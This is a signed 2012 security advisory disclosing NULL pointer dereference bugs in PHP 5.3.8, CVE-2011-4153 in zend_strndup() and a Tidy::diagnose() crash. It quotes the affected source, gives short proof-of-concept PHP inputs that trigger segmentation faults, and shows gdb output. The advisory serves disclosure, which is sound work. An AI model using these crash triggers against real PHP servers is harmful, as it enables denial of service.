@@ -1,0 +1,272 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[ PHP 5.3.8 Multiple vulnerabilities ]
+
+Author: Maksymilian Arciemowicz
+Website: http://cxsecurity.com/
+Date: 14.01.2012
+
+CVE:
+CVE-2011-4153 (zend_strndup)
+
+Original link:
+http://cxsecurity.com/research/103
+
+
+[--- 1. Multiple NULL Pointer Dereference with zend_strndup()
+[CVE-2011-4153] ---]
+As we can see in zend_strndup()
+
+- -zend_alloca.c---
+ZEND_API char *zend_strndup(const char *s, uint length)
+{
+	char *p;
+
+	p = (char *) malloc(length+1);
+	if (UNEXPECTED(p == NULL)) {
+		return p; <=== RETURN NULL
+	}
+	if (length) {
+		memcpy(p, s, length);
+	}
+	p[length] = 0;
+	return p;
+}
+- -zend_alloca.c---
+
+zend_strndup() may return NULL
+
+in php code, many calls to zend_strndup() dosen't checks returned
+values. In result, places like:
+
+- -zend_builtin_functions.c---
+ZEND_FUNCTION(define)
+{
+	char *name;
+	int name_len;
+	zval *val;
+	zval *val_free = NULL;
+	zend_bool non_cs = 0;
+	int case_sensitive = CONST_CS;
+	zend_constant c;
+
+	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "sz|b", &name,
+&name_len, &val, &non_cs) == FAILURE) {
+		return;
+	}
+...
+	c.flags = case_sensitive; /* non persistent */
+	c.name = zend_strndup(name, name_len); <======== MAY RETURN NULL
+	c.name_len = name_len+1;
+	c.module_number = PHP_USER_CONSTANT;
+	if (zend_register_constant(&c TSRMLS_CC) == SUCCESS) {
+		RETURN_TRUE;
+	} else {
+		RETURN_FALSE;
+	}
+}
+- -zend_builtin_functions.c---
+
+- -PoC code---
+[cx@82 /www]$ ulimit -a
+socket buffer size       (bytes, -b) unlimited
+core file size          (blocks, -c) unlimited
+data seg size           (kbytes, -d) 524288
+file size               (blocks, -f) unlimited
+max locked memory       (kbytes, -l) unlimited
+max memory size         (kbytes, -m) 40000
+open files                      (-n) 11095
+pipe size            (512 bytes, -p) 1
+stack size              (kbytes, -s) 65536
+cpu time               (seconds, -t) unlimited
+max user processes              (-u) 5547
+virtual memory          (kbytes, -v) 40000
+swap size               (kbytes, -w) unlimited
+[cx@82 /www]$ cat define.php
+<?php
+define(str_repeat("A",$argv[1]),"a");
+?>
+- -PoC code---
+
+to see difference
+
+[cx@82 /www]$ php define.php 8999999
+Out of memory
+[cx@82 /www]$ php define.php 9999999
+Segmentation fault: 11
+
+(gdb) bt
+#0  0x28745eb0 in strrchr () from /lib/libc.so.7
+#1  0x0822d538 in zend_register_constant (c=0xbfbfcfb0)
+    at /usr/ports/lang/php5/work/php/Zend/zend_constants.c:429
+#2  0x08251e0e in zif_define (ht=2, return_value=0x28825a98,
+    return_value_ptr=0x0, this_ptr=0x0, return_value_used=0)
+    at /usr/ports/lang/php5/work/php/Zend/zend_builtin_functions.c:688
+#3  0x0826dba6 in zend_do_fcall_common_helper_SPEC
+(execute_data=0x29401040)
+    at zend_vm_execute.h:316
+
+
+There are others places, where zend_strndup() is used:
+
+- -1--
+ext/soap/php_sdl.c
+			if (sdl->is_persistent) {
+				new_enc->details.ns = zend_strndup(ns, ns_len);
+				new_enc->details.type_str = strdup(new_enc->details.type_str);
+			} else {
+				new_enc->details.ns = estrndup(ns, ns_len);
+				new_enc->details.type_str = estrdup(new_enc->details.type_str);
+			}
+- -1--
+
+- -2--
+ext/standard/syslog.c
+	BG(syslog_device) = zend_strndup(ident, ident_len);
+	openlog(BG(syslog_device), option, facility);
+	RETURN_TRUE;
+- -2--
+
+- -3--
+ext/standard/browscap.c
+				} else { /* Other than true/false setting */
+					Z_STRVAL_P(new_property) = zend_strndup(Z_STRVAL_P(arg2),
+Z_STRLEN_P(arg2));
+					Z_STRLEN_P(new_property) = Z_STRLEN_P(arg2);
+				}
+				new_key = zend_strndup(Z_STRVAL_P(arg1), Z_STRLEN_P(arg1));
+				zend_str_tolower(new_key, Z_STRLEN_P(arg1));
+				zend_hash_update(Z_ARRVAL_P(current_section), new_key,
+Z_STRLEN_P(arg1) + 1, &new_property, sizeof(zval *), NULL);
+				free(new_key);
+- -3--
+
+- -4--
+ext/oci8/oci8.c
+		if (alloc_non_persistent) {
+			connection = (php_oci_connection *) ecalloc(1,
+sizeof(php_oci_connection));
+			connection->hash_key = estrndup(hashed_details.c, hashed_details.len);
+			connection->is_persistent = 0;
+		} else {
+			connection = (php_oci_connection *) calloc(1,
+sizeof(php_oci_connection));
+			connection->hash_key = zend_strndup(hashed_details.c,
+hashed_details.len);
+			connection->is_persistent = 1;
+		}
+- -4--
+
+- -5--
+ext/com_dotnet/com_typeinfo.c
+				const_name = php_com_olestring_to_string(bstr_ids, &c.name_len,
+codepage TSRMLS_CC);
+				c.name = zend_strndup(const_name, c.name_len);
+				efree(const_name);
+				c.name_len++; /* include NUL */
+				SysFreeString(bstr_ids);
+
+				/* sanity check for the case where the constant is already defined */
+				if (zend_get_constant(c.name, c.name_len - 1, &exists TSRMLS_CC)) {
+					if (COMG(autoreg_verbose) && !compare_function(&results,
+&c.value, &exists TSRMLS_CC)) {
+						php_error_docref(NULL TSRMLS_CC, E_WARNING, "Type library
+constant %s is already defined", c.name);
+					}
+					free(c.name);
+					ITypeInfo_ReleaseVarDesc(TypeInfo, pVarDesc);
+					continue;
+				}
+- -5--
+
+- -6--
+main/php_open_temporary_file.c
+	/* On Unix use the (usual) TMPDIR environment variable. */
+	{
+		char* s = getenv("TMPDIR");
+		if (s && *s) {
+			int len = strlen(s);
+
+			if (s[len - 1] == DEFAULT_SLASH) {
+				temporary_directory = zend_strndup(s, len - 1);
+			} else {
+				temporary_directory = zend_strndup(s, len);
+			}
+
+			return temporary_directory;
+		}
+- -6--
+
+
+[--- 2. Tidy::diagnose() NULL pointer dereference ---]
+Class tidy, may provide to null pointer dereference using tidy lib.
+
+1287 	static PHP_FUNCTION(tidy_diagnose)
+1288 	{
+1289 	TIDY_FETCH_OBJECT;
+1290 	
+1291 	if (tidyRunDiagnostics(obj->ptdoc->doc) >= 0) {
+1292 	tidy_doc_update_properties(obj TSRMLS_CC);
+1293 	RETURN_TRUE;
+1294 	}
+1295 	
+1296 	RETURN_FALSE;
+1297 	}
+
+- -PoC---
+(gdb) r -r '$nx=new Tidy("*");$nx->diagnose();'
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /usr/bin/php -r '$nx=new Tidy("*");$nx->diagnose();'
+[Thread debugging using libthread_db enabled]
+PHP Warning:  tidy::__construct(): Cannot Load '*' into memory  in
+Command line code on line 1
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffedfaff87 in prvTidyReportMarkupVersion ()
+   from /usr/lib/libtidy-0.99.so.0
+- -PoC---
+
+- -Result---
+cx@cx64:~$ php -r '$nx=new Tidy("*");$nx->diagnose();'
+PHP Warning:  tidy::__construct(): Cannot Load '*' into memory  in
+Command line code on line 1
+Segmentation fault
+- -Result---
+
+I do not consider this vulnerability as a having security impact other
+as DoS.
+
+[--- 3. Contact ---]
+Author: Maksymilian Arciemowicz
+Email: max {AA\TT cxsecurity |D|0|T] com
+http://cxsecurity.com/
+
+GPG:
+http://cxsecurity.com/office.cxsecurity.txt
+
+
+- -- 
+Best Regards
+Maksymilian Arciemowicz (CXSecurity.com)
+pub   4096R/D6E5B530 2010-09-19
+uid                  Maksymilian Arciemowicz (cx) <max@cxib.net>
+sub   4096R/58BA663C 2010-09-19
+-----BEGIN PGP SIGNATURE-----
+
+iQIcBAEBAgAGBQJPEWEaAAoJEIO8+dzW5bUwiQIP+wW7gqAMB3FtONREDS9rUa83
+VTJpMzCNdZw5cy7qIwivC4usdRUbidFy8Bqt/TA/3x8nWVm3Wx//5DPyFWb/RNZh
+swSS7+9f6XJA4tEF/eTn6lCEG4xp2wLxHgxqIqmWR09gkOifhKHVEEXlO5qsQxhx
+T5hEYqbvXEknzlUS/HC9C6sZsZK0EbdPjxDqe1qE+P3GyHecfoVb3s7WQw0IitZT
+l47by1UbJ2iGj5q4EExLyj2FxomIw46LFdFtePHOI6EZcq/MODnyCGNkzVpS4tyK
+SNIxiSp7nM1n08a6kQ1pZrMyTUO/LATojJ6qf79bJApyhK1ggs4WF+E73wItiFt0
+ordQeqWy2hTLyv+UlbsoFErSgASgw5MIw3ygZXNZsdQWEMj+UCUTrsro7k/zB6Uy
+3r4ccmyf1Vd+kLx12SAR/uxHIlqQVskQDi2k45CPHQVAYGKdax24ksVlfgQ2K/dY
+2SCj9gEDAOKqtNLxyFyEStraeb330TrxbGaI25gjiDVf7nYgPowqdaM1gI862MoR
+vP4vbFFY9ldwTBsLz9DNMVObsNWsoz2BlQ6olCgUPqkvce9RyI6rp+QwyIXQLcVr
+jUGMXhpmDrNR2oyA4ufsZ4u5W8KUIK3t26v8649k3LSzmRpmK1TSTNqdHwm9WfMa
+0qg+Bq1hSEVfTOuqOY7x
+=IDq3
+-----END PGP SIGNATURE-----
